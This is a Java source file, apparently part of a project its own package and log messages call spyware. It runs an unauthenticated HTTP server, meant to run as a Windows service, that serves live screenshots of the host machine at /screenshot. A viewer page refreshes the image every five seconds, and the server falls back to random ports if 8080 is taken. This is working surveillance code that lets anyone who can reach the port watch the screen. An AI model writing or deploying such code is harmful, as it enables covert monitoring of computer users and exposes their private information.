package com.github.moaxcp.spyware;

import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.io.UncheckedIOException;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.Random;
import java.util.concurrent.Executors;

/**
 * Simple web service using JDK's built-in HttpServer that exposes endpoints,
 * including /screenshot which returns a PNG image captured by ScreenshotService.
 *
 * Also provides start/stop lifecycle methods compatible with Windows service wrappers.
 */
public class WebServer {
    private HttpServer server;

    private int port;

    /**
     * Starts the web server without blocking. Intended for Windows service wrappers.
     */
    public void start(int port) {
      this.port = port;
      try {
        server = HttpServer.create(new InetSocketAddress(port), 0);
      } catch (IOException e) {
        if (port == 8080) {
          Random random = new Random();
          while (server == null) {
            this.port = random.nextInt(65535 - 1024) + 1024;
            try {
              server = HttpServer.create(new InetSocketAddress(this.port), 0);
            } catch (IOException ignored) {
            }
          }
        } else {
          throw new UncheckedIOException(e);
        }
      }

      // Register handlers
        server.createContext("/screenshot", new ScreenshotHandler(new ScreenshotService()));
        server.createContext("/", exchange -> {
            if (!"GET".equalsIgnoreCase(exchange.getRequestMethod())) {
                exchange.getResponseHeaders().add("Allow", "GET");
                exchange.sendResponseHeaders(405, -1);
                exchange.close();
                return;
            }
            String message = """
                  <html>
                    <head>
                      <meta name="viewport" content="width=device-width, initial-scale=1">
                      <style>
                        html, body { height: 100%; margin: 0; }
                        #stage {
                          width: 100vw;
                          height: 100vh;
                          overflow: hidden;
                          background: #111;
                          touch-action: none; /* helps avoid browser gestures interfering */
                          cursor: grab;
                        }
                        #stage.dragging { cursor: grabbing; }

                        #screenshot {
                          width: 100%;
                          height: auto;
                          display: block;
                          transform-origin: 0 0;
                          user-select: none;
                          -webkit-user-drag: none;
                        }
                      </style>
                    </head>
                    <body>
                      <div style="padding: 8px; color: #ddd; font-family: sans-serif;">
                        Spyware web service is running. Try GET <a href="/screenshot">/screenshot</a> to get a PNG screenshot.
                        (Wheel to zoom, drag to pan.)
                      </div>

                      <div id="stage">
                        <img src="/screenshot" id="screenshot" alt="screenshot"/>
                      </div>

                      <script>
                        const img = document.getElementById('screenshot');
                        const stage = document.getElementById('stage');

                        let scale = 1;
                        let tx = 0, ty = 0;

                        function applyTransform() {
                          img.style.transform = `translate(${tx}px, ${ty}px) scale(${scale})`;
                        }
                        applyTransform();

                        // Zoom with wheel, keeping the point under the cursor stable.
                        stage.addEventListener('wheel', (e) => {
                          e.preventDefault();

                          const rect = stage.getBoundingClientRect();
                          const cx = e.clientX - rect.left;
                          const cy = e.clientY - rect.top;

                          const oldScale = scale;
                          const zoomFactor = Math.exp(-e.deltaY * 0.0015); // smooth zoom
                          scale = Math.min(8, Math.max(1, scale * zoomFactor));

                          // Adjust translation so (cx,cy) stays anchored
                          tx = cx - (cx - tx) * (scale / oldScale);
                          ty = cy - (cy - ty) * (scale / oldScale);

                          applyTransform();
                        }, { passive: false });

                        // Pan by dragging
                        let dragging = false;
                        let lastX = 0, lastY = 0;

                        stage.addEventListener('mousedown', (e) => {
                          dragging = true;
                          stage.classList.add('dragging');
                          lastX = e.clientX;
                          lastY = e.clientY;
                        });

                        window.addEventListener('mousemove', (e) => {
                          if (!dragging) return;
                          tx += (e.clientX - lastX);
                          ty += (e.clientY - lastY);
                          lastX = e.clientX;
                          lastY = e.clientY;
                          applyTransform();
                        });

                        window.addEventListener('mouseup', () => {
                          dragging = false;
                          stage.classList.remove('dragging');
                        });

                        // Keep refreshing the screenshot image
                        setInterval(function() {
                          img.src = '/screenshot?rand=' + Math.random();
                        }, 5000);
                      </script>
                    </body>
                  </html>
                  """;
            byte[] body = message.getBytes(StandardCharsets.UTF_8);
            exchange.getResponseHeaders().add("Content-Type", "text/html; charset=utf-8");
            exchange.sendResponseHeaders(200, body.length);
            try (OutputStream os = exchange.getResponseBody()) {
                os.write(body);
            }
        });

        server.setExecutor(Executors.newCachedThreadPool());
        server.start();
        System.out.println("[Spyware] Web server started on port " + this.port + ". Endpoints: /, /screenshot");
    }

    public int getPort() {
        return port;
    }

    public String getIP() {
        return server.getAddress().getAddress().getHostAddress();
    }

    /**
     * Stops the web server. Intended for Windows service wrappers.
     */
    public void stop() {
        if (server == null) {
            System.out.println("[Spyware] Server not running");
            return;
        }
        // 0-second delay: stop immediately, closing existing connections
        server.stop(0);
        server = null;
        System.out.println("[Spyware] Web server stopped");
    }

    public boolean isRunning() {
        return server != null;
    }
}
